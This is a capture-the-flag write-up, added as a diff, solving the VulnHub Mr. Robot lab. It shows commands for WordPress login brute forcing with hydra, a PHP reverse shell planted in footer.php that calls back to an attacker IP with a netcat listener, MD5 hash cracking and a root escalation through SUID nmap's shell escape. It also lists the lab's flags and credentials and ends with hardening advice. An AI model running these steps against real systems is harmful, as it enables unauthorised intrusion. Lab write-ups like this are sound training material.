@@ -1,0 +1,297 @@
+================================================================================
+Mr. Robot CTF - Technical Solution Guide
+https://www.vulnhub.com/entry/mr-robot-1,151/
+================================================================================
+
+OBJECTIVE: Find 3 hidden keys
+DIFFICULTY: Beginner-Intermediate
+TARGET IP: 10.0.2.11
+
+================================================================================
+[1] RECONNAISSANCE
+================================================================================
+
+# Network scan
+nmap -sV -sC -p- 10.0.2.0/24
+
+Target: 10.0.2.11
+Open Ports:
+  22/tcp  - closed (SSH)
+  80/tcp  - open (HTTP)
+  443/tcp - open (HTTPS)
+
+# Web vulnerability scan
+nikto -h http://10.0.2.11
+
+Findings:
+  - WordPress installation detected
+  - Apache server with PHP/5.5.29
+  - Admin endpoints: /wp-admin/, /wp-login.php
+  - robots.txt file found
+
+# robots.txt analysis
+curl http://10.0.2.11/robots.txt
+
+Content:
+  User-agent: *
+  fsocity.dic
+  key-1-of-3.txt
+
+# First flag
+curl http://10.0.2.11/key-1-of-3.txt
+FLAG 1: 073403c8a58a1f80d943455fb30724b9
+
+================================================================================
+[2] WORDPRESS ENUMERATION
+================================================================================
+
+# WordPress scan
+wpscan --url http://10.0.2.11 --enumerate u,vp
+
+Results:
+  - WordPress version: 4.3.1 (vulnerable, released 2015-09-15)
+  - Theme: Twenty Fifteen v1.3
+  - XML-RPC enabled
+  - No users found via passive enumeration
+
+# Download and process dictionary
+curl -O http://10.0.2.11/fsocity.dic
+wc -l fsocity.dic
+# Output: 858160 lines (contains duplicates)
+
+# Remove duplicates
+sort fsocity.dic | uniq > fs.dic
+wc -l fs.dic
+# Output: 11451 unique entries
+
+================================================================================
+[3] CREDENTIAL DISCOVERY
+================================================================================
+
+# Username enumeration via brute force
+hydra -L fs.dic -p test 10.0.2.11 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username' -f
+
+Result: Username "Elliot" discovered
+
+# Password brute force
+wpscan --url http://10.0.2.11 -P fs.dic -U Elliot
+
+Valid credentials found:
+  Username: Elliot
+  Password: ER28-0652
+
+================================================================================
+[4] INITIAL ACCESS - REVERSE SHELL
+================================================================================
+
+# Access WordPress admin panel
+URL: http://10.0.2.11/wp-admin/
+Login: Elliot / ER28-0652
+
+# Prepare reverse shell
+cp /usr/share/webshells/php/php-reverse-shell.php ./
+
+# Edit shell configuration (lines 49-50)
+$ip = '10.0.2.6';    # Attacker IP
+$port = 4444;         # Listener port
+
+# Deployment method: Theme Editor
+1. Navigate to: Appearance → Editor
+2. Select file: footer.php
+3. Replace content with reverse shell code
+4. Update file
+
+# Start listener
+nc -nvlp 4444
+
+# Trigger shell
+Visit any page on http://10.0.2.11
+
+# Connection received
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+
+# Stabilize shell
+python -c "import pty; pty.spawn('/bin/bash')"
+export TERM=xterm
+
+================================================================================
+[5] LATERAL MOVEMENT - USER PRIVILEGE
+================================================================================
+
+# Enumerate home directories
+cd /home
+ls -la
+
+# Check robot user directory
+cd /home/robot
+ls -la
+
+Files found:
+  -r-------- 1 robot robot 33 Nov 13 2015 key-2-of-3.txt
+  -rw-r--r-- 1 robot robot 39 Nov 13 2015 password.raw-md5
+
+# Read password hash
+cat password.raw-md5
+Output: robot:c3fcd3d76192e4007dfb496cca67e13b
+
+# Crack MD5 hash
+Hash: c3fcd3d76192e4007dfb496cca67e13b
+Type: MD5
+Plaintext: abcdefghijklmnopqrstuvwxyz
+
+# Switch to robot user
+su robot
+Password: abcdefghijklmnopqrstuvwxyz
+
+# Read second flag
+cat /home/robot/key-2-of-3.txt
+FLAG 2: 822c73956184f694993bede3eb39f959
+
+================================================================================
+[6] PRIVILEGE ESCALATION - ROOT ACCESS
+================================================================================
+
+# Check sudo permissions
+sudo -l
+Result: user robot may not run sudo
+
+# Search for SUID binaries
+find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+
+Critical finding:
+  -rwsr-xr-x 1 root root 504736 Nov 13 2015 /usr/local/bin/nmap
+
+# Check nmap version
+nmap --version
+Output: nmap version 3.81
+
+# Exploit nmap interactive mode
+nmap --interactive
+
+Starting nmap V. 3.81
+Welcome to Interactive Mode -- press h <enter> for help
+
+nmap> !sh
+!sh
+
+# Verify root access
+whoami
+Output: root
+
+# Navigate to root directory
+cd /root
+ls -la
+
+# Read final flag
+cat key-3-of-3.txt
+FLAG 3: 04787ddef27c3dee1ee161b21670b4e4
+
+================================================================================
+[7] FLAGS SUMMARY
+================================================================================
+
+Key 1: 073403c8a58a1f80d943455fb30724b9  (Location: /key-1-of-3.txt)
+Key 2: 822c73956184f694993bede3eb39f959  (Location: /home/robot/key-2-of-3.txt)
+Key 3: 04787ddef27c3dee1ee161b21670b4e4  (Location: /root/key-3-of-3.txt)
+
+================================================================================
+[8] VULNERABILITIES EXPLOITED
+================================================================================
+
+1. Information Disclosure
+   - robots.txt exposed sensitive files and wordlist
+
+2. Weak Authentication
+   - WordPress login vulnerable to dictionary attack
+   - No rate limiting or account lockout
+
+3. Insecure File Permissions
+   - Password hash file world-readable (644 permissions)
+
+4. Misconfigured SUID Binaries
+   - Nmap binary with SUID bit enabled
+   - Interactive mode allows shell escape
+
+5. Outdated Software
+   - WordPress 4.3.1 (EOL, contains known vulnerabilities)
+   - PHP 5.5.29 (unsupported version)
+
+6. WordPress Theme Editor Access
+   - Authenticated users can modify PHP files
+   - Allows arbitrary code execution
+
+================================================================================
+[9] TOOLS USED
+================================================================================
+
+- Nmap 7.98           : Network scanning and service enumeration
+- Nikto 2.5.0         : Web server vulnerability scanner
+- WPScan 3.8.28       : WordPress security scanner
+- Hydra               : Network authentication cracker
+- Netcat              : Reverse shell listener
+- Python 2.7.6        : Shell stabilization (PTY module)
+- curl/wget           : File download and HTTP requests
+
+================================================================================
+[10] SECURITY RECOMMENDATIONS
+================================================================================
+
+1. Remove sensitive information from robots.txt
+2. Implement rate limiting on login endpoints
+3. Enforce strong password policies
+4. Keep WordPress and plugins updated
+5. Disable WordPress file editor in production (define('DISALLOW_FILE_EDIT', true))
+6. Audit and remove unnecessary SUID bits
+7. Implement proper file permission schemes
+8. Regular security updates and patch management
+9. Enable Web Application Firewall (WAF)
+10. Implement account lockout mechanisms
+
+================================================================================
+[11] ATTACK CHAIN SUMMARY
+================================================================================
+
+robots.txt disclosure
+    ↓
+Dictionary download (fsocity.dic)
+    ↓
+Username enumeration (Elliot)
+    ↓
+Password brute force (ER28-0652)
+    ↓
+WordPress admin access
+    ↓
+Theme editor exploitation (reverse shell)
+    ↓
+Initial access as daemon user
+    ↓
+Password hash discovery (password.raw-md5)
+    ↓
+MD5 hash cracking (abcdefghijklmnopqrstuvwxyz)
+    ↓
+User escalation (daemon → robot)
+    ↓
+SUID binary discovery (nmap)
+    ↓
+Privilege escalation (robot → root)
+    ↓
+Complete compromise (all flags captured)
+
+================================================================================
+REFERENCES
+================================================================================
+
+- VulnHub: https://www.vulnhub.com/entry/mr-robot-1,151/
+- GTFOBins Nmap: https://gtfobins.github.io/gtfobins/nmap/
+- WordPress Security: https://developer.wordpress.org/advanced-administration/security/
+- OWASP Top 10: https://owasp.org/www-project-top-ten/
+
+================================================================================
+DISCLAIMER
+================================================================================
+
+This writeup is for educational purposes only. All techniques demonstrated
+should only be used on systems you own or have explicit permission to test.
+Unauthorized access to computer systems is illegal.
+
+================================================================================
